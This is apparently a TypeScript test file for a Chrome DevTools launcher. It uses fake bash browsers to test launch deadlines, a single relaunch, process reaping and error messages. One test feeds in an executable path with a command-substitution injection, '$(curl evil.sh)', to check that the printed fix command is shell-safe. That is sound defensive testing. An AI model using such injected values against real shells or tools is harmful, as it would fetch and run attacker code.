// The launch DEADLINE and the one RELAUNCH, against fake browsers: shell scripts that answer late,
// in pieces, never, or on the second start only. The real Chrome is `e2e/cdp-browser.e2e.test.ts`.

import { describe, expect, test } from 'bun:test';
// why: a throwaway executable script is the fake browser; Bun has no mkdtemp, chmod or recursive rm of its own.
import { chmod, mkdtemp, rm, writeFile } from 'node:fs/promises';
// why: the scratch directory lives under the OS temp dir, which Bun does not expose.
import { tmpdir } from 'node:os';
// why: joining the script and its launch-log paths.
import { join } from 'node:path';
import { CdpLaunchFailedError } from './cdp-errors';
import { LAUNCH_ATTEMPTS, LAUNCH_TIMEOUT_MS, launchChrome } from './cdp-launch';

/**
 * Every fake appends one line per START to `$LOG` — its pid, its `--user-data-dir`, and whether the
 * launch before it had left a live process or a profile directory behind — and names its own
 * ordinal `$N` on stderr, so a cause can be asked which launches it quotes.
 */
const PRELUDE = `
LOG="$(dirname "$0")/launches"
for a in "$@"; do case "$a" in --user-data-dir=*) PROFILE="\${a#--user-data-dir=}";; esac; done
PREV=first
if [ -s "$LOG" ]; then
  read -r PPID_ PDIR_ _ <<<"$(tail -n 1 "$LOG")"
  if kill -0 "$PPID_" 2>/dev/null; then ALIVE=alive; else ALIVE=reaped; fi
  if [ -e "$PDIR_" ]; then KEPT=kept; else KEPT=removed; fi
  PREV="$ALIVE,$KEPT"
fi
echo "$$ $PROFILE $PREV" >>"$LOG"
N="$(wc -l <"$LOG" | tr -d ' ')"
echo "launch-$N-said-this" >&2
`;

/** Read the launcher's first call off fd 3 and answer id 1 on fd 4. */
const ANSWER = `read -r -d '' _ <&3\nprintf '{"id":1,"result":{"product":"Fake"}}\\0' >&4\n`;

interface Fake {
  readonly fake: string;
  readonly launches: () => Promise<readonly (readonly string[])[]>;
  readonly [Symbol.asyncDispose]: () => Promise<void>;
}

const fakeBrowser = async (script: string): Promise<Fake> => {
  const dir = await mkdtemp(join(tmpdir(), 'x-relaunch-fake-'));
  const fake = join(dir, 'chrome');
  await writeFile(fake, `#!/bin/bash\n${PRELUDE}\n${script}`, 'utf8');
  await chmod(fake, 0o755);
  return {
    fake,
    launches: async () => {
      const log = Bun.file(join(dir, 'launches'));
      if (!(await log.exists())) return [];
      return (await log.text())
        .trim()
        .split('\n')
        .map((line) => line.split(' '));
    },
    [Symbol.asyncDispose]: () => rm(dir, { recursive: true, force: true }),
  };
};

const alive = (pid: string): boolean => {
  try {
    process.kill(Number(pid), 0);
    return true;
  } catch {
    return false;
  }
};

/**
 * Every fake here is a bash script talking on fds 3 and 4 — POSIX only: Windows executes no `#!`
 * script and is driven over a port (`cdp-launch-wire.ts`). `cdp-launch.test.ts` proves the launcher
 * there against the machine's real Chrome.
 */
const WINDOWS = process.platform === 'win32';

describe.skipIf(WINDOWS)('launchChrome — the launch deadline', () => {
  test('the default is measured in tens of seconds, and there is exactly one relaunch', () => {
    // 2026-10-02, `scaffold-smoke`: 11 cold first launches cost 5-19 s more than a warm one, and
    // the one that failed was still starting at 30 s. A floor below that is the flake.
    expect(LAUNCH_TIMEOUT_MS).toBeGreaterThanOrEqual(60_000);
    expect(LAUNCH_ATTEMPTS).toBe(2);
  });

  test('a browser slower than the PER-CALL deadline still launches, on its first start', async () => {
    // A cold start is not a call: 1 s to answer against a 300 ms call deadline. The launcher gave
    // the first call the per-call deadline, so this was X_CDP_LAUNCH_FAILED quoting start-up noise.
    await using it = await fakeBrowser(`sleep 1\n${ANSWER}sleep 30\n`);

    const launched = await launchChrome({ executable: it.fake, timeoutMs: 300 });
    try {
      expect(await it.launches()).toHaveLength(1);
      // …and every call AFTER the first keeps the caller's own deadline: the fake answers nothing
      // more, and that is reported in 300 ms, not in the launch's sixty seconds.
      const started = performance.now();
      const late = await launched.connection.send('Browser.getVersion').catch((e: unknown) => e);
      expect(late).toBeUltimateError('X_CDP_TIMEOUT');
      expect(performance.now() - started).toBeLessThan(3_000);
    } finally {
      await launched.close();
    }
  });

  test('the first reply split across three writes, after 64 kB of D-Bus noise, is one reply', async () => {
    const noise =
      '[2919:2944:1002/123125.064472:ERROR:dbus/bus.cc:405] Failed to connect to the bus: Could not parse server address';
    await using it = await fakeBrowser(
      [
        `for i in $(seq 1 560); do echo '${noise}' >&2; done`,
        `read -r -d '' _ <&3`,
        // Cut inside the JSON and then inside a two-byte character (ä is c3 a4).
        `printf '{"id":1,"res' >&4; sleep 0.1`,
        `printf 'ult":{"product":"F\\xc3' >&4; sleep 0.1`,
        `printf '\\xa4ke"}}\\0' >&4`,
        'sleep 30',
      ].join('\n'),
    );

    const launched = await launchChrome({ executable: it.fake, timeoutMs: 5_000 });
    await launched.close();

    expect(await it.launches()).toHaveLength(1);
  });

  test('an unreadable launchTimeoutMs is refused before anything is spawned', async () => {
    await using it = await fakeBrowser(`${ANSWER}sleep 30\n`);

    const error = await launchChrome({
      executable: it.fake,
      timeoutMs: 300,
      launchTimeoutMs: Number.NaN,
    }).catch((e: unknown) => e);

    expect(error).toBeUltimateError();
    expect(await it.launches()).toHaveLength(0);
  });
});

describe.skipIf(WINDOWS)('launchChrome — the one relaunch', () => {
  test('a first start that never answers is reaped, and the second start is the browser', async () => {
    await using it = await fakeBrowser(
      `if [ "$N" = 1 ]; then exec sleep 30; fi\n${ANSWER}sleep 30\n`,
    );

    const launched = await launchChrome({
      executable: it.fake,
      timeoutMs: 300,
      launchTimeoutMs: 300,
    });
    await launched.close();

    const [first, second, ...rest] = await it.launches();
    expect(rest).toHaveLength(0);
    // What the SECOND start saw of the first: no process, no profile directory. A relaunch beside a
    // half-dead browser is two Chromes on one runner, which is the load that made the first late.
    expect(second?.[2]).toBe('reaped,removed');
    expect(second?.[1]).not.toBe(first?.[1]);
  });

  test('a first start that ignores SIGTERM is killed outright before the second', async () => {
    await using it = await fakeBrowser(
      `if [ "$N" = 1 ]; then trap '' TERM; while true; do sleep 1; done; fi\n${ANSWER}sleep 30\n`,
    );

    const launched = await launchChrome({
      executable: it.fake,
      timeoutMs: 300,
      launchTimeoutMs: 300,
    });
    await launched.close();

    expect((await it.launches())[1]?.[2]).toBe('reaped,removed');
  }, 20_000);

  test('what the browser FORKED is reaped with it, so the profile stays removed', async () => {
    // Chrome's network process outlives the browser process and writes into the profile: measured
    // on Chrome 150, the directory was re-created after 6 and 12 of 30 closes. The fake's child
    // ignores SIGTERM and re-creates the profile every 20 ms, for as long as it lives.
    await using it = await fakeBrowser(
      [
        `( trap '' TERM; while true; do mkdir -p "$PROFILE"; echo x >"$PROFILE/late"; sleep 0.02; done ) &`,
        `echo "$!" >"$(dirname "$0")/forked-$N"`,
        ANSWER,
        'sleep 30',
      ].join('\n'),
    );

    const launched = await launchChrome({ executable: it.fake, timeoutMs: 5_000 });
    await launched.close();

    const [first] = await it.launches();
    const forked = (await Bun.file(join(it.fake, '..', 'forked-1')).text()).trim();
    expect(alive(forked)).toBe(false);
    await Bun.sleep(100);
    expect(await Bun.file(join(first?.[1] ?? '', 'late')).exists()).toBe(false);
  });

  test('two silent starts are X_CDP_LAUNCH_FAILED carrying BOTH stderr tails, and no third', async () => {
    await using it = await fakeBrowser('exec sleep 30\n');

    const started = performance.now();
    const error = await launchChrome({
      executable: it.fake,
      timeoutMs: 300,
      launchTimeoutMs: 300,
    }).catch((e: unknown) => e);

    expect(error).toBeUltimateError('X_CDP_LAUNCH_FAILED');
    const { cause, meta } = error as CdpLaunchFailedError;
    expect(cause).toContain('launch-1-said-this');
    expect(cause).toContain('launch-2-said-this');
    expect(cause).toContain('300ms');
    expect(meta?.['attempts']).toMatchObject([
      { why: 'deadline', exitCode: null, stderr: 'launch-1-said-this' },
      { why: 'deadline', exitCode: null, stderr: 'launch-2-said-this' },
    ]);
    const launches = await it.launches();
    expect(launches).toHaveLength(LAUNCH_ATTEMPTS);
    for (const [pid, profile] of launches) {
      expect(alive(pid ?? '')).toBe(false);
      expect(await Bun.file(profile ?? '').exists()).toBe(false);
    }
    // Two deadlines and two reaps — bounded, never the fakes' 30 s.
    expect(performance.now() - started).toBeLessThan(5_000);
  });

  test('a browser that EXITS says so, with its code, and is not reported as a deadline', async () => {
    await using it = await fakeBrowser(`echo 'libnss3.so: cannot open' >&2\nexit 127\n`);

    const error = await launchChrome({ executable: it.fake, timeoutMs: 5_000 }).catch(
      (e: unknown) => e,
    );

    expect(error).toBeUltimateError('X_CDP_LAUNCH_FAILED');
    const { cause, meta } = error as CdpLaunchFailedError;
    expect(cause).toContain('exited with code 127');
    expect(cause).toContain('libnss3.so');
    expect(meta?.['attempts']).toMatchObject([
      { why: 'closed', exitCode: 127 },
      { why: 'closed', exitCode: 127 },
    ]);
  });
});

describe('CdpLaunchFailedError', () => {
  const attempts = [{ why: 'deadline', waitedMs: 60_000, exitCode: null, stderr: '' }] as const;

  test('the fix is the same binary, as one command a shell runs', () => {
    const { fix } = new CdpLaunchFailedError({ executable: '/usr/bin/google-chrome', attempts });

    expect(fix).toBe(
      '/usr/bin/google-chrome --headless=new --no-sandbox --disable-dev-shm-usage --disable-gpu --remote-debugging-port=0 about:blank',
    );
  });

  test('a path a shell would EXECUTE never reaches the fix', () => {
    const { fix, cause } = new CdpLaunchFailedError({
      executable: '/tmp/$(curl evil.sh)/chrome',
      attempts,
    });

    expect(fix).not.toContain('curl');
    expect(fix.startsWith('"$CHROME_PATH" --headless=new')).toBe(true);
    expect(cause).toContain('printed nothing');
  });
});
